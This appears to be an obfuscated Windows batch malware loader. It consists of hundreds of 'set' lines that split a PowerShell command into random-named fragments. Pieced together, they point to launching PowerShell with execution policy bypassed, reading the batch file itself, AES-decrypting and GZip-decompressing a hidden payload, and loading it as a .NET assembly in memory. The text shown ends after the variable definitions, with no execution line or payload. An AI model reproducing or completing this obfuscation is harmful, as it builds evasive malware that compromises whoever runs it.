@echo off
set "iEKuYZwaqJ=in"
set "BbxtDlpAMu=Sy"
set "wqxEEMHhzO=we"
set "cTMRMjlmLH=Po"
set "YYjZeKqshj=rS"
set "yuWDZugmfk=s\"
set "vDDjLgmCCL=st"
set "bmlcEuEEJX=we"
set "KmDGDWVJTD=.e"
set "vurpVbrcJj=co"
set "yxYgnVRMST=\W"
set "NWGKGSqNnk=32"
set "UOhRvNYKBJ=ow"
set "lCFwdUFEKV=em"
set "bszMjaTDEv=y "
set "oBiKqUiMVi=nd"
set "nJgVwzbJNA=ll"
set "gfevwaxoem= /"
set "JGFGcYYxZB=po"
set "bMLVNztWTU=rs"
set "vXRiGMZYex=he"
set "ljMQnNTojU=py"
set "STfCmzyoYS=1."
set "OAlEuNhDVS= C"
set "PyornODyih=ws"
set "NIdcApRnDE=0\"
set "hwZujeKMNc=\v"
set "UttYzjmgfB=Wi"
set "FbEfoEddJs=xe"
set "mxjisloyzn=he"
set "AapwQAxbxg=ll"
set "NylcpEpyrF=:\"
set "FLPQGzWSDS=do"
set "VdcxfZulZl=cd"
set "zLQTmheswZ= %~dp0"
set "DMIBPquHQr=f, 0"
set "wpoXIlWlee=se()"
set "wPavXvXctM=('%~f0'"
set "tyFnaulkyA=vert"
set "cxFsRQsamm=am;$"
set "dZzXgGyYJK=m(, "
set "IKrvkcQteg=y]::"
set "CTochqgycf=pher"
set "WhYZdXHcln=join"
set "xGZMzzFWez=t Sy"
set "dctWVSVUya=-Obj"
set "aXFRClmrlM='gni"
set "rcgaIWboQd=gsYZ"
set "fInnZzqqLZ=oL'["
set "sRRZRMpwlW=ose("
set "BmUnlZJFqI=ke($"
set "ogQAXFDKVt=in $"
set "jDAjeyqsdC=('da"
set "qXOFWCfkwv=ddin"
set "IoYIFxDCJf=g = "
set "sredOGaXYE===')"
set "ezUBtSKfPz=em.I"
set "fStqQTUEYy=eam("
set "IColtndDUi= = ["
set "qEvpVMmouu=$YGO"
set "DNtnAevtZD=ay()"
set "ArHNcbOLrJ= '')"
set "UZPKBbIqDu=TllA"
set "ZNHJjbYQFh=urit"
set "QNZrkilBJO=]::("
set "rstXQMCuRT=ect "
set "aClnaNdNhM=DtpO"
set "PBFLycHtWN=DtpO"
set "LAfJzWmWNI=raph"
set "GpqTVlRVQX=;$DQ"
set "BwrFElyUNQ=nH.T"
set "HOSfxapsVv=ICRf"
set "uOKlYWTMUj=nirt"
set "CesEIYmyJs=, $u"
set "yVJaceHSiB=.Key"
set "SXbbMeaVAy=nnJN"
set "ydvRMzWBhh=J) {"
set "cUagnYiJgz=UAl "
set "uIeNFkqeNP=fore"
set "HArIWuQtas=.Cre"
set "JGneBMPmAh=gjYA"
set "WEfpzWqVMp=morF"
set "eqVxWoNLjX=saBm"
set "PEgjRyCvFM=Rf);"
set "DMvNZuBLXm=.Cop"
set "kqlvKaJhHP=3); "
set "ROBuAZrCwC=ptog"
set "zZUDROcefz== [S"
set "jiMcNFZjoQ=ring"
set "kiCmoUHyAV=gth)"
set "moHfFwhVnc=[Sys"
set "xdwztpdxah=.Com"
set "TZXshkHMNn=oin "
set "ulpfHHrLiC=Syst"
set "QQMZolgnUn=PKCS"
set "myHzChZZZR=.Sec"
set "dumrFedxgK=tZWt"
set "OdOsKeRKIY=y.Ci"
set "nBXdCxhTML=ionM"
set "ROXeznkEwn=.Dis"
set "xAlptOxuzd=DQQh"
set "hLcxlqiNKY=tem."
set "mtLqVrJVNU=106u"
set "fAuSPmpJHS=ddin"
set "tIaGWuYSJl=hL.D"
set "wfzbmAjfIc=eMVs"
set "VvFkTyrgBa=New-"
set "yGUIssnnRN=ispo"
set "tTKLxiCrkk=esMa"
set "uakBKuoPhP=V = "
set "JQJVpNusuA=uICR"
set "ThVXGsuthz=hy.A"
set "MVKGtnhywI=:('g"
set "TRCMrYRSlU=nH);"
set "IySoSUOvDX=pO.I"
set "EEqhEwUpFy=pStr"
set "YpYgXmYnlz=.Con"
set "ZjybQMdLSe=DtpO"
set "aiNbWGyiXe= = $"
set "IWwdIXFeTp=form"
set "rVPtXQNvQK=..-1"
set "BOKhhftDlT=comp"
set "YZcjUQBULd=uICR"
set "HXDeGlPiMw=ew-O"
set "xqSyfSpBBk=m.IO"
set "fpeeaVcziA=.Mem"
set "JbxaLGNGNa=-4] "
set "wGOMwbGNlA= [st"
set "kyXpUuVXfx=stem"
set "suPEGILIgj=ptor"
set "kUcCXIthON=lit("
set "pTavrWqGHV=ode]"
set "HuyzDEPsDQ=ck($"
set "IDIKadoadN=f = "
set "wotdWbzjRG=PxEW"
set "dnTywylRqr=-1.."
set "WUGpfsWrUV=[Sys"
set "sIOqOxmksy=[Sys"
set "ncSXBesBRU=eJ ="
set "yFZOquFRqZ=tem."
set "sGMIzohVZk=trea"
set "pdlgLHSdCj=n ''"
set "koQSynlygP=embl"
set "PhPpkBiSnm=wdhL"
set "AsrytmVnJf=d;$l"
set "ZdgejscjtG= = N"
set "VMlaQcKQZU=ress"
set "MWspxSricK=rofi"
set "XKDUxMyIbG=K = "
set "uXIugENzuP=ach "
set "jhDWTpofvX=] -j"
set "BEZmqWVKoA=Rf ="
set "bDTxdBlvjj=flec"
set "uHkEZndSzC=Wtp "
set "VKlqQbUnfw=ress"
set "NVmxajJfta=m.IO"
set "PAPILVMXKn=.Len"
set "KmXfJcakLY=Secu"
set "TVxuTKZhFD=PTtG"
set "eovBgjzyJy=k; }"
set "aXALdviXrn=Wka "
set "ydFKwClpwo=ateD"
set "iLzEAvZINV=6esa"
set "JbDNXYBcSQ=Star"
set "pjOCdOWVQo=$YGO"
set "UtRxMPPiya=gMod"
set "lRegfrspCK=bjec"
set "WzxuSMTJpz=rtS4"
set "UOzyHRXoPj=..-1"
set "EdltwPTDdO=;$Ne"
set "FXFNJpoOlW=DtpO"
set "QlmduCMyyo=ment"
set "GmxMJFkDqr=ewLi"
set "cTtKaDkDxI=O.Me"
set "PjBdYcYXcT= = $"
set "qwOBDkiNRX=YxVw"
set "VHKghfugaC=[]] "
set "narpUiXIeb=($cZ"
set "ykIralKZNx=UAl."
set "acLuCcoKSN=Wka."
set "iDmAtAvChV=.Ass"
set "jXvRNpybrh=1..-"
set "oWgoCbLXCX==');"
set "cTWsblAXbP=YNGe"
set "WLTgOxQIKF=QsEf"
set "chQdEuwVdc=pose"
set "VdbLsXORKs=nH ="
set "vdsUAksHjg= if "
set "WsEDMbYDwv='txe"
set "kQaiLniASG=yTo("
set "YemDxZhHEW=$lwd"
set "QDjmZPZvnm=$NeW"
set "vWkoXySzsL=raph"
set "WTuDJawdvL=-joi"
set "zFXmzrBuOQ=grap"
set "mVjxwhKQJy=join"
set "WpYpetcKvr=oryS"
set "NSyWLcuSja=pose"
set "ueQqnMhZXn=stem"
set "kvqdMByCBJ=oint"
set "KLLnQkFlCY=Syst"
set "OIksQVqJQc=cZUA"
set "zVYotMmihs=1] -"
set "iZDrwVDOom=m.Re"
set "aoldiXaRoh=[IO."
set "AsTLxlxDsV=:: '"
set "queKRHSjmT=l5E7"
set "EFrKZFUlOr=DtpO"
set "LTPRAdtcYL=Disp"
set "ZYiawsjDkf=QhK."
set "cQoFLwlizH=]::N"
set "MwROmIBXzD=, (,"
set "FTpUyvbQDu=ion."
set "GCpUNRqBeU=7;$l"
set "ZLZSTRegAF=$YNG"
set "SMlJviNPGu=ptog"
set "BziIAKiEXO=rans"
set "OgzXxXPajx=$YGO"
set "mmjIyPdSwH=tem."
set "ClfbXPtrht=ne);"
set "lEEqgIEhUw=16] "
set "VwAaXUpPMv=ing("
set "ROgtuHIQEH=6] -"
set "uRkpyZZzks=ypto"
set "DLboRhsxEz=);$l"
set "fgtcYrargi= [Sy"
set "LnGkpAPkPI=);$l"
set "IKuKfCdcit=O.Pa"
set "JkVZKuLLeI=Secu"
set "nCSnoTCXvY=f = "
set "oGvnwKzhWI=.Cry"
set "QfVkqUfAFY=yste"
set "oylchIbqoE=yste"
set "suwnBOvrus=lDtp"
set "DnMzwjkLDQ=.Dis"
set "ZsBPmquAMp=lBlo"
set "bjUVmhwhKl=);$l"
set "kksVhpPOVE=bypa"
set "FpYcAZUnuT=and "
set "CowfJlvaUp=th('"
set "qwtzBGAbNr=gnir"
set "TmlqzttLQA=brea"
set "ADYdmsBTOj=L = "
set "iuuPOLToSJ=em.C"
set "FZtfcsBbil=ct S"
set "aEJzlFfhcM=iron"
set "kEjSBUEQCn=sion"
set "VDBnuyTqgH= New"
set "PzMJUEmbkZ=-ep "
set "DAMsbZaosU=-nop"
set "JxtVEeSnpJ=.-16"
set "HtvANSsWTB=File"
set "AfYaYQknJc=;$tZ"
set "frayFySgvg=New-"
set "QXzCwojUOB=; };"
set "kniCiOAUwB=le  "
set "aqUTKlUxwo=Obje"
set "eieXRSXAem=stem"
set "wCEhZaBlsl=e = "
set "PQnDxyyBfy=ct S"
set "GZyGtgNmXH=l.Su"
set "fXMrjAhsrt=CFxo"
set "abOUcGbHEa=lwdh"
set "moOwizmGRD=Disp"
set "LRqMwaPwWF=p.En"
set "byFmHbWROa=nage"
set "GTenrcNgpn=y.Cr"
set "LedESIEJfB=S46e"
set "ZSLHpIuTCU=null"
set "GotfiyMnKp=ecry"
set "PtiebkbMJR=.GZi"
set "sKvnVORDjz=ert]"
set "xLgMmsdZlo=('%*'"
set "PkkEOvBJpE=.Mod"
set "nYuYYMKyTk=ress"
set "GrHNqdFXMf=Comp"
set "heiPFDxbBv=.IO."
set "WDdKGbUawU=yste"
set "pUSYXcokrl=.Cry"
set "MJCLdjTpPv=ICRf"
set "bEnUABIfhB=zuZI"
set "LAIfdWKbNG=n ''"
set "HYuGiprkjm=ss -"
set "AlxjYVMIUl= [Sy"
set "npuFCNgilQ=Conv"
set "ZraWSBeRMc=pres"
set "XAIXJQOMVt=esaB"
set "bGKvONPzvJ=).Sp"
set "BOrTfsglzy=uICR"
set "oRpXRWWARy=();$"
set "NqKVkGACcS=$lDt"
set "SWyVyrQiaW=zHhH"
set "tkFkGSGsGC=tryP"
set "FoVpzvSOLP=Bmor"
set "nQPRnkqweh='[-1"
set "jZIwXrvgpX=Mode"
set "rWrNyoPSNL='[-1"
set "iGUyaBIhhH=BC;$"
set "deVFYvleqB=();$"
set "nBawASOcKM=sEf."
set "hMLNoUHZdw=::De"
set "kxsClxVnHD=onve"
set "uUIjJIRfNL=[-1."
set "mycMTeknCs=)($u"
set "OgijmpLZof=tion"
set "idqcEfkppp== $l"
set "cHIbKDJPaH=)))"
set "bsbZsNzzsS=GOnH"
set "YwBIKiQCdV=::('"
set "xMNEEiqbNh=ose("
set "uMJPSKAbOt=s75K"
set "rihhLQLmIW=($cZ"
set "WfBIKfLOmQ=();$"
set "HVPoiFwNPC=)) {"
set "FJtxwJljAD=$uIC"
set "nJszVRySDY=Stre"
set "TeXzroMMac=-joi"
set "TTNVByMgXD=tsWi"
set "tKXnXwhwWw=Fina"
set "xIXxnRdUuf='')("
set "BlwlODdWzo=ka.T"
set "QsxIaKNuaG=e]::"
set "WCppscHKrV=]::("
set "JzQKKnGDsv=rt]:"
set "SaPlUNZjJw=]::C"
set "iUfbxzKwxG=('Tg"
set "pwQYjUPFMN=orF'"
set "CzSxVvLsXQ=RmAx"
set "XfvbsnHjDW=Obje"
set "dldnhabsUA=L4Yi"
set "ygSRemkJvS=comm"
set "BbAfKkmKIY=dj0C"
set "lhZRJOrWcH=y.Pa"
set "BrxUNxgoBq=);$Y"
set "WyymXsrggL=mory"
set "iUYMExfVxG=F'[-"
set "xLRDzqBmaU=Invo"
set "ZvSVYhsDuM=$uIC"
set "mQCRAGLHNE= '')"
set "FCsatRDIvi=;$Ne"
set "YBtcaIjxRy=rity"
set "CAhDqAZbxq=nnJN"
set "KnUMrGiVVH=$DQQ"
set "yEckVuFxeL=  $f"
set "lNgeDCRVMJ=tS46"
set "cBpcEmrLpt='0Pg"
set "FupzBpQbnp=bstr"
set "ZdADPtmnuQ=oArr"
set "XRxEDEpIFV=)($f"
set "bivEFissXP=);$i"
set "AsiUxFoboe=hK, "
set "eISDeACeZs=rity"
set "ukfvwueQFx=daeR"
set "qxNkhrJDPX=Comp"
set "bFuCVhgDcI=[Env"
